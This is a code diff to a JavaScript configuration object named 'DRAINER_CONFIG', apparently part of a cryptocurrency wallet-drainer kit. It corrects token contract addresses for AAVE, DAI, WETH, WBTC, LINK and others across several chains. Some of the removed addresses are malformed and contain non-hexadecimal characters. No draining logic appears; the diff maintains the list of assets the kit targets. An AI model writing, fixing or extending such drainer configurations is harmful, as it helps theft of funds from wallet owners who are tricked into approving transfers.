@@ -193,7 +193,7 @@ window.DRAINER_CONFIG = {
             { symbol: "XRP", address: "0x1D2F0da169ceB9fC7B3B4aDb29f676A423506441", decimals: 18 },
             { symbol: "LINK", address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD", decimals: 18 },
             { symbol: "UNI", address: "0xBf5140A22578168FD362D2C5614b0cD0F27Cfc3c", decimals: 18 },
-            { symbol: "AAVE", address: "0xfb6115081aac7987c4ee5142a655f1b67information3A0d", decimals: 18 },
+            { symbol: "AAVE", address: "0x7fc49F20B7aFcAa64aD00128563B824b0324b32E", decimals: 18 },
             { symbol: "SUSHI", address: "0x947950BcC74888a40Ffa2593C5798F11Fc9124C4", decimals: 18 },
             { symbol: "1INCH", address: "0x111111111117dC0aa78b770fA6A738034120C302", decimals: 18 },
             // Large Cap Meme
@@ -222,15 +222,15 @@ window.DRAINER_CONFIG = {
             // Stablecoins
             { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
             { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6 },
-            { symbol: "DAI", address: "0xDA10009CBD5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
-            { symbol: "FRAX", address: "0x17FC002b466eec40Dae837Fe11EB78B742D84b7b", decimals: 18 },
+            { symbol: "DAI", address: "0xDA10009CBD5D07dd0CeCc66161FC93D7c9000Da1", decimals: 18 },
+            { symbol: "FRAX", address: "0x17FC002b466eec40Dae837Fe11EB78B742D84b7B", decimals: 18 },
             // Major Assets
-            { symbol: "WETH", address: "0x82aF49447d8a07e3bd95bd0d56f318521751e236", decimals: 18 },
-            { symbol: "WBTC", address: "0x2f2a2440d2CdC120a8fCd15D8D4edBE49876davE", decimals: 8 },
+            { symbol: "WETH", address: "0x82aF49447d8a07e3bd95bd0d56f318521751E236", decimals: 18 },
+            { symbol: "WBTC", address: "0x2f2a2440d2CdC120a8fCd15D8D4edBE49876daBe", decimals: 8 },
             // DEX & DeFi
             { symbol: "UNI", address: "0xFa7F8980b0f1E64A2062791cc3FB0A4047912294", decimals: 18 },
-            { symbol: "AAVE", address: "0xba5DdaB4256c590B66b3fa7127126A47162F5B06", decimals: 18 },
-            { symbol: "LINK", address: "0xf97f4df75117e07371157A51d100573A2c7F1a65", decimals: 18 },
+            { symbol: "AAVE", address: "0xBA5DdaB4256c590B66b3fa7127126A47162F5b06", decimals: 18 },
+            { symbol: "LINK", address: "0xf97f4df75117e07371157A51d100573A2c7f1a65", decimals: 18 },
             { symbol: "ARB", address: "0x912CE59144191C1204E64559FE8253a0e49E6548", decimals: 18 },
             { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d3E710233C904", decimals: 30 }
         ],
@@ -245,13 +245,13 @@ window.DRAINER_CONFIG = {
             // DEX & DeFi
             { symbol: "UNI", address: "0x6fd9d7AD17242c41f7131d257212c54A0Be56e7F", decimals: 18 },
             { symbol: "OP", address: "0x4200000000000000000000000000000000000042", decimals: 18 },
-            { symbol: "AAVE", address: "0x7fa1a0C20971185c308b21d61d039f36f2CEDdDx", decimals: 18 }
+            { symbol: "AAVE", address: "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0", decimals: 18 }
         ],
         AVALANCHE: [
             // Stablecoins
             { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
             { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
-            { symbol: "DAI", address: "0xd586E7F844cEa2F87f50En3EB400F8433b8C0C4D", decimals: 18 },
+                { symbol: "DAI", address: "0xd586E7F844cEa2F87f50E3EB400F8433b8C0C4D", decimals: 18 },
             // Major Assets
             { symbol: "WAVAX", address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18 },
             { symbol: "WETH", address: "0x49D8123dd7F6F93d77f3B1b8eF0aea3Fc2E85AaB", decimals: 18 },
@@ -409,7 +409,7 @@ window.DRAINER_CONFIG = {
             // DEX & DeFi
             { symbol: "UNI", address: "0x6fd9d7AD17242c41f7131d257212c54A0Be56e7F", decimals: 18 },
             { symbol: "OP", address: "0x4200000000000000000000000000000000000042", decimals: 18 },
-            { symbol: "AAVE", address: "0x7fa1a0C20971185c308b21d61d039f36f2CEDdDc", decimals: 18 }
+            { symbol: "AAVE", address: "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0", decimals: 18 },
         ],
         AVALANCHE: [
             // Stablecoins
